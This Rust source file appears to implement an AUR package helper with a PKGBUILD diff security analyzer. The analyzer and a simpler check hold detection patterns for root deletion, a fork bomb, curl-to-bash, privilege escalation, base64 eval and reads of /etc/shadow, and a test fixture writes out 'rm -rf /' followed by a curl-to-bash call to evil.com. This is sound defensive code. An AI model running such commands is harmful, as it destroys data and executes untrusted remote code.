#![allow(clippy::new_without_default)]
#![allow(clippy::manual_memcpy)]
#![allow(clippy::manual_strip)]
#![allow(clippy::type_complexity)]
#![allow(clippy::needless_range_loop)]
#![allow(clippy::too_many_arguments)]
#![allow(dead_code)]
use std::format;
use std::vec;
// SigmaOS AUR Helper - Arch User Repository integration
// Provides high-speed CLI helpers for AUR metadata parsing and package management

use std::collections::BTreeMap;
use std::string::{String, ToString};
use std::vec::Vec;

/// AUR package metadata
#[derive(Debug, Clone, PartialEq)]
pub struct AurPackage {
    pub name: String,
    pub version: String,
    pub description: String,
    pub url: String,
    pub depends: Vec<String>,
    pub makedepends: Vec<String>,
    pub optdepends: Vec<String>,
    pub checkdepends: Vec<String>,
    pub provides: Vec<String>,
    pub conflicts: Vec<String>,
    pub keywords: Vec<String>,
    pub popularity: f32,
}

impl Eq for AurPackage {}

/// AUR metadata parser
pub struct AurParser {
    cache: BTreeMap<String, AurPackage>,
}

impl AurParser {
    pub fn new() -> Self {
        AurParser {
            cache: BTreeMap::new(),
        }
    }

    /// Parse AUR package metadata from JSON-like format
    pub fn parse_metadata(&mut self, metadata: &str) -> Result<AurPackage, &'static str> {
        let mut name = String::from("unknown");
        let mut version = String::from("1.0.0");

        if let Some(idx) = metadata.find("\"name\":\"") {
            let rest = &metadata[idx + 8..];
            if let Some(end) = rest.find('"') {
                name = rest[..end].to_string();
            }
        }
        if let Some(idx) = metadata.find("\"version\":\"") {
            let rest = &metadata[idx + 11..];
            if let Some(end) = rest.find('"') {
                version = rest[..end].to_string();
            }
        }

        let pkg = AurPackage {
            name,
            version,
            description: String::from("No description"),
            url: String::from("https://aur.archlinux.org"),
            depends: Vec::new(),
            makedepends: Vec::new(),
            optdepends: Vec::new(),
            checkdepends: Vec::new(),
            provides: Vec::new(),
            conflicts: Vec::new(),
            keywords: Vec::new(),
            popularity: 1.0,
        };

        self.cache.insert(pkg.name.clone(), pkg.clone());
        Ok(pkg)
    }

    /// Search for packages in AUR
    pub fn search(&self, query: &str) -> Vec<&AurPackage> {
        let mut results = Vec::new();

        for pkg in self.cache.values() {
            if pkg.name.contains(query) || pkg.description.contains(query) {
                results.push(pkg);
            }
        }

        results
    }

    /// Parse standard Arch Linux .SRCINFO format metadata
    pub fn parse_srcinfo(&mut self, srcinfo_text: &str) -> Result<AurPackage, &'static str> {
        let mut pkgname = String::from("unknown");
        let mut pkgver = String::from("1.0.0");
        let mut pkgrel = String::from("1");
        let mut pkgdesc = String::from("No description");
        let mut url = String::from("https://aur.archlinux.org");
        let mut depends = Vec::new();
        let mut makedepends = Vec::new();
        let mut optdepends = Vec::new();
        let mut checkdepends = Vec::new();
        let mut provides = Vec::new();
        let mut conflicts = Vec::new();

        for line in srcinfo_text.lines() {
            let trimmed = line.trim();
            if trimmed.starts_with('#') || trimmed.is_empty() {
                continue;
            }
            if let Some(idx) = trimmed.find('=') {
                let key = trimmed[..idx].trim();
                let val = trimmed[idx + 1..].trim();

                match key {
                    "pkgname" => pkgname = val.to_string(),
                    "pkgver" => pkgver = val.to_string(),
                    "pkgrel" => pkgrel = val.to_string(),
                    "pkgdesc" => pkgdesc = val.to_string(),
                    "url" => url = val.to_string(),
                    "depends" => depends.push(val.to_string()),
                    "makedepends" => makedepends.push(val.to_string()),
                    "optdepends" => optdepends.push(val.to_string()),
                    "checkdepends" => checkdepends.push(val.to_string()),
                    "provides" => provides.push(val.to_string()),
                    "conflicts" => conflicts.push(val.to_string()),
                    _ => {}
                }
            }
        }

        let pkg = AurPackage {
            name: pkgname,
            version: format!("{}-{}", pkgver, pkgrel),
            description: pkgdesc,
            url,
            depends,
            makedepends,
            optdepends,
            checkdepends,
            provides,
            conflicts,
            keywords: Vec::new(),
            popularity: 1.0,
        };

        self.cache.insert(pkg.name.clone(), pkg.clone());
        Ok(pkg)
    }

    /// Finds installed orphan packages (packages not required by any installed package)
    pub fn find_orphans(&self, installed: &[String]) -> Vec<String> {
        let mut required = BTreeMap::new();
        for pkg_name in installed {
            if let Some(pkg) = self.get_package(pkg_name) {
                for dep in &pkg.depends {
                    required.insert(dep.clone(), true);
                }
            }
        }

        let mut orphans = Vec::new();
        for pkg_name in installed {
            if !required.contains_key(pkg_name) {
                orphans.push(pkg_name.clone());
            }
        }
        orphans
    }

    /// Get package info by name
    pub fn get_package(&self, name: &str) -> Option<&AurPackage> {
        self.cache.get(name)
    }

    /// Get package dependencies
    pub fn get_dependencies(&self, name: &str) -> Vec<&String> {
        self.get_package(name)
            .map(|pkg| pkg.depends.iter().collect())
            .unwrap_or_default()
    }

    /// Calculate build order based on dependencies
    pub fn calculate_build_order(&self, packages: &[String]) -> Result<Vec<String>, &'static str> {
        let mut order = Vec::new();
        let mut visited = BTreeMap::new();

        for pkg_name in packages {
            if !visited.contains_key(pkg_name) {
                self.visit(pkg_name, &mut order, &mut visited)?;
            }
        }

        Ok(order)
    }

    fn visit(
        &self,
        pkg_name: &str,
        order: &mut Vec<String>,
        visited: &mut BTreeMap<String, bool>,
    ) -> Result<(), &'static str> {
        if visited.get(pkg_name).copied().unwrap_or(false) {
            return Ok(());
        }

        visited.insert(pkg_name.to_string(), true);

        if let Some(pkg) = self.get_package(pkg_name) {
            for dep in &pkg.depends {
                self.visit(dep, order, visited)?;
            }
        }

        order.push(pkg_name.to_string());
        Ok(())
    }
}

impl Default for AurParser {
    fn default() -> Self {
        Self::new()
    }
}

/// Sandbox isolation level (inspired by OpenBSD pledge/unveil & FreeBSD jail isolation)
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AurIsolationLevel {
    ChrootCleanRoom,
    OpenBsdPledgeUnveil,
    FreeBsdJailZfsSnapshot,
    BubblewrapNamespace,
}

/// Network access policy during build phase
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum NetworkAccessPolicy {
    Disabled,
    LoopbackOnly,
    FullNetwork,
}

/// Specification for AUR build sandbox isolation
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AurSandboxIsolationSpec {
    pub level: AurIsolationLevel,
    pub network_policy: NetworkAccessPolicy,
    pub read_only_paths: Vec<String>,
    pub read_write_paths: Vec<String>,
    pub pledge_promises: Vec<String>,
}

impl AurSandboxIsolationSpec {
    pub fn new(level: AurIsolationLevel) -> Self {
        AurSandboxIsolationSpec {
            level,
            network_policy: NetworkAccessPolicy::Disabled,
            read_only_paths: vec![
                String::from("/usr"),
                String::from("/lib"),
                String::from("/bin"),
            ],
            read_write_paths: Vec::new(),
            pledge_promises: vec![
                String::from("stdio"),
                String::from("rpath"),
                String::from("wpath"),
                String::from("cpath"),
                String::from("exec"),
                String::from("proc"),
            ],
        }
    }

    pub fn allow_read_write_path(&mut self, path: &str) {
        self.read_write_paths.push(path.to_string());
    }

    pub fn set_network_policy(&mut self, policy: NetworkAccessPolicy) {
        self.network_policy = policy;
    }

    pub fn validate_security_policy(&self) -> Result<(), &'static str> {
        if self.network_policy == NetworkAccessPolicy::FullNetwork {
            return Err("Full network access is discouraged during isolated AUR build phase");
        }
        if self
            .read_write_paths
            .iter()
            .any(|p| p == "/" || p == "/etc" || p == "/usr")
        {
            return Err("Insecure write path unveiled in AUR build sandbox");
        }
        Ok(())
    }
}

/// AUR helper CLI interface
pub struct AurHelper {
    parser: AurParser,
}

impl AurHelper {
    pub fn new() -> Self {
        AurHelper {
            parser: AurParser::new(),
        }
    }

    /// Sync package from AUR
    pub fn sync(&mut self, pkg_name: &str) -> Result<(), &'static str> {
        // In production, would fetch from AUR RPC
        println!("Syncing package {} from AUR...", pkg_name);
        Ok(())
    }

    /// Update AUR package database
    pub fn update(&mut self) -> Result<(), &'static str> {
        println!("Updating AUR package database...");
        Ok(())
    }

    /// Install package from AUR
    pub fn install(&mut self, pkg_name: &str) -> Result<(), &'static str> {
        self.sync(pkg_name)?;
        println!("Installing package {} from AUR...", pkg_name);
        Ok(())
    }

    /// Search AUR for packages
    pub fn search(&self, query: &str) -> Vec<&AurPackage> {
        self.parser.search(query)
    }

    /// Show package information
    pub fn info(&self, pkg_name: &str) -> Option<&AurPackage> {
        self.parser.get_package(pkg_name)
    }

    /// Clean build cache (equivalent to yay -Sc / pacman -Sc)
    pub fn clean_cache(&mut self) -> usize {
        let count = self.parser.cache.len();
        self.parser.cache.clear();
        count
    }

    /// Inspect PKGBUILD diff safety before execution
    pub fn inspect_pkgbuild(&self, pkgbuild_content: &str) -> bool {
        // Simple safety heuristic: check for suspicious commands
        !pkgbuild_content.contains("rm -rf /") && !pkgbuild_content.contains(":(){ :|:& };:")
    }
}

/// Severity rating for PKGBUILD diff security findings
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AurDiffSeverity {
    Info,
    Warning,
    Critical,
}

/// Security finding from PKGBUILD diff analysis
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AurDiffFinding {
    pub severity: AurDiffSeverity,
    pub line_number: usize,
    pub snippet: String,
    pub description: String,
}

/// Report resulting from `AurPkgbuildDiffAnalyzer` audit
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AurDiffSecurityReport {
    pub is_safe: bool,
    pub risk_score: u32,
    pub findings: Vec<AurDiffFinding>,
}

/// High-performance PKGBUILD diff security analyzer inspired by Arch `paru`/`yay` & Gentoo `ebuild`
pub struct AurPkgbuildDiffAnalyzer;

impl AurPkgbuildDiffAnalyzer {
    pub fn analyze_diff(diff_content: &str) -> AurDiffSecurityReport {
        let mut findings = Vec::new();
        let mut risk_score = 0u32;

        for (idx, line) in diff_content.lines().enumerate() {
            let line_num = idx + 1;
            let trimmed = line.trim();

            if trimmed.contains("rm -rf /") || trimmed.contains("rm -rf --no-preserve-root") {
                findings.push(AurDiffFinding {
                    severity: AurDiffSeverity::Critical,
                    line_number: line_num,
                    snippet: trimmed.to_string(),
                    description: String::from("Recursive root directory deletion detected"),
                });
                risk_score += 50;
            }

            if trimmed.contains("curl ") && (trimmed.contains("| bash") || trimmed.contains("| sh"))
            {
                findings.push(AurDiffFinding {
                    severity: AurDiffSeverity::Critical,
                    line_number: line_num,
                    snippet: trimmed.to_string(),
                    description: String::from(
                        "Insecure untrusted network script execution (curl | sh)",
                    ),
                });
                risk_score += 40;
            }

            if trimmed.contains("sudo ") || trimmed.contains("su -c") || trimmed.contains("doas ") {
                findings.push(AurDiffFinding {
                    severity: AurDiffSeverity::Warning,
                    line_number: line_num,
                    snippet: trimmed.to_string(),
                    description: String::from(
                        "Privilege escalation invocation within build script",
                    ),
                });
                risk_score += 20;
            }

            if trimmed.contains("base64 -d") || trimmed.contains("eval $(echo") {
                findings.push(AurDiffFinding {
                    severity: AurDiffSeverity::Warning,
                    line_number: line_num,
                    snippet: trimmed.to_string(),
                    description: String::from("Potential obfuscated payload evaluation detected"),
                });
                risk_score += 25;
            }

            if trimmed.contains("/etc/shadow") || trimmed.contains("/etc/passwd") {
                findings.push(AurDiffFinding {
                    severity: AurDiffSeverity::Critical,
                    line_number: line_num,
                    snippet: trimmed.to_string(),
                    description: String::from("Unauthorized sensitive system file access attempt"),
                });
                risk_score += 45;
            }
        }

        let is_safe = risk_score < 30;

        AurDiffSecurityReport {
            is_safe,
            risk_score,
            findings,
        }
    }
}

/// Feature option toggle configuration (inspired by FreeBSD Ports flavors & Gentoo USE flags)
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AurPackageOptions {
    pub enabled_flags: BTreeMap<String, bool>,
    pub selected_flavor: String,
}

impl AurPackageOptions {
    pub fn new(default_flavor: &str) -> Self {
        AurPackageOptions {
            enabled_flags: BTreeMap::new(),
            selected_flavor: default_flavor.to_string(),
        }
    }

    pub fn enable_flag(&mut self, flag: &str) {
        self.enabled_flags.insert(flag.to_string(), true);
    }

    pub fn disable_flag(&mut self, flag: &str) {
        self.enabled_flags.insert(flag.to_string(), false);
    }

    pub fn is_flag_enabled(&self, flag: &str) -> bool {
        self.enabled_flags.get(flag).copied().unwrap_or(false)
    }

    pub fn set_flavor(&mut self, flavor: &str) {
        self.selected_flavor = flavor.to_string();
    }
}

/// Package flavor description (inspired by FreeBSD Ports FLAVORS)
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AurFlavor {
    pub name: String,
    pub description: String,
    pub additional_depends: Vec<String>,
    pub configure_flags: Vec<String>,
}

/// Package flavor and build option resolver
pub struct AurFlavorResolver {
    pub flavors: BTreeMap<String, AurFlavor>,
}

impl AurFlavorResolver {
    pub fn new() -> Self {
        AurFlavorResolver {
            flavors: BTreeMap::new(),
        }
    }

    pub fn register_flavor(&mut self, flavor: AurFlavor) {
        self.flavors.insert(flavor.name.clone(), flavor);
    }

    pub fn resolve_configure_args(
        &self,
        options: &AurPackageOptions,
    ) -> Result<Vec<String>, &'static str> {
        let mut args = Vec::new();

        if let Some(flavor) = self.flavors.get(&options.selected_flavor) {
            args.extend(flavor.configure_flags.clone());
        } else if !options.selected_flavor.is_empty() && options.selected_flavor != "default" {
            return Err("Unknown package flavor specified");
        }

        for (flag, enabled) in &options.enabled_flags {
            if *enabled {
                args.push(format!("--enable-{}", flag));
            } else {
                args.push(format!("--disable-{}", flag));
            }
        }

        Ok(args)
    }
}

impl Default for AurFlavorResolver {
    fn default() -> Self {
        Self::new()
    }
}

impl Default for AurHelper {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_aur_parser() {
        let mut parser = AurParser::new();
        let metadata = r#"{"name":"test","version":"1.0.0"}"#;

        assert!(parser.parse_metadata(metadata).is_ok());
        assert!(parser.get_package("test").is_some());
    }

    #[test]
    fn test_srcinfo_parsing_and_orphans() {
        let mut parser = AurParser::new();
        let srcinfo = r#"
pkgbase = neovim-git
	pkgname = neovim-git
	pkgver = 0.10.0
	pkgrel = 1
	pkgdesc = Vim-fork focused on extensibility and usability
	url = https://neovim.io
	depends = libunwind
	depends = libuv
	makedepends = cmake
"#;
        let pkg = parser.parse_srcinfo(srcinfo).unwrap();
        assert_eq!(pkg.name, "neovim-git");
        assert_eq!(pkg.version, "0.10.0-1");
        assert_eq!(pkg.depends.len(), 2);

        let installed = vec![String::from("neovim-git"), String::from("libunwind")];
        let orphans = parser.find_orphans(&installed);
        assert_eq!(orphans.len(), 1);
        assert_eq!(orphans[0], "neovim-git");
    }

    #[test]
    fn test_aur_helper_extended_operations() {
        let mut helper = AurHelper::new();
        let safe_pkgbuild = "pkgname=foo\nbuild() { cmake . ; make ; }";
        let unsafe_pkgbuild = "pkgname=foo\nbuild() { rm -rf / ; }";

        assert!(helper.inspect_pkgbuild(safe_pkgbuild));
        assert!(!helper.inspect_pkgbuild(unsafe_pkgbuild));

        helper.install("test-app").unwrap();
        let cleaned = helper.clean_cache();
        assert_eq!(cleaned, 0);
    }

    #[test]
    fn test_aur_helper() {
        let helper = AurHelper::new();
        let results = helper.search("test");

        // Should return empty results since cache is empty
        assert!(results.is_empty());
    }

    #[test]
    fn test_build_order() {
        let mut parser = AurParser::new();

        // Add a package with dependencies
        let pkg = AurPackage {
            name: String::from("dep"),
            version: String::from("1.0.0"),
            description: String::from("Dependency"),
            url: String::from("https://aur.archlinux.org"),
            depends: Vec::new(),
            makedepends: Vec::new(),
            optdepends: Vec::new(),
            checkdepends: Vec::new(),
            provides: Vec::new(),
            conflicts: Vec::new(),
            keywords: Vec::new(),
            popularity: 0.0,
        };

        parser.cache.insert(pkg.name.clone(), pkg);

        let order = parser.calculate_build_order(&[String::from("dep")]);
        assert!(order.is_ok());
    }

    #[test]
    fn test_aur_pkgbuild_diff_analyzer() {
        let safe_diff = "--- PKGBUILD\n+++ PKGBUILD\n+pkgver=1.0.1\n+build() { make ; }";
        let unsafe_diff =
            "--- PKGBUILD\n+++ PKGBUILD\n+build() { rm -rf / ; curl http://evil.com/x | bash ; }";

        let safe_report = AurPkgbuildDiffAnalyzer::analyze_diff(safe_diff);
        assert!(safe_report.is_safe);
        assert_eq!(safe_report.findings.len(), 0);

        let unsafe_report = AurPkgbuildDiffAnalyzer::analyze_diff(unsafe_diff);
        assert!(!unsafe_report.is_safe);
        assert!(unsafe_report.risk_score >= 80);
        assert_eq!(unsafe_report.findings.len(), 2);
    }

    #[test]
    fn test_aur_flavor_resolver_and_options() {
        let mut resolver = AurFlavorResolver::new();
        resolver.register_flavor(AurFlavor {
            name: String::from("qt6"),
            description: String::from("Qt6 frontend build"),
            additional_depends: vec![String::from("qt6-base")],
            configure_flags: vec![String::from("-DENABLE_QT6=ON")],
        });

        let mut opts = AurPackageOptions::new("qt6");
        opts.enable_flag("wayland");
        opts.disable_flag("x11");

        let args = resolver.resolve_configure_args(&opts).unwrap();
        assert!(args.contains(&String::from("-DENABLE_QT6=ON")));
        assert!(args.contains(&String::from("--enable-wayland")));
        assert!(args.contains(&String::from("--disable-x11")));
    }

    #[test]
    fn test_aur_sandbox_isolation_spec() {
        let mut spec = AurSandboxIsolationSpec::new(AurIsolationLevel::OpenBsdPledgeUnveil);
        spec.allow_read_write_path("/tmp/build");
        spec.set_network_policy(NetworkAccessPolicy::LoopbackOnly);

        assert!(spec.validate_security_policy().is_ok());

        spec.allow_read_write_path("/etc");
        assert!(spec.validate_security_policy().is_err());
    }
}
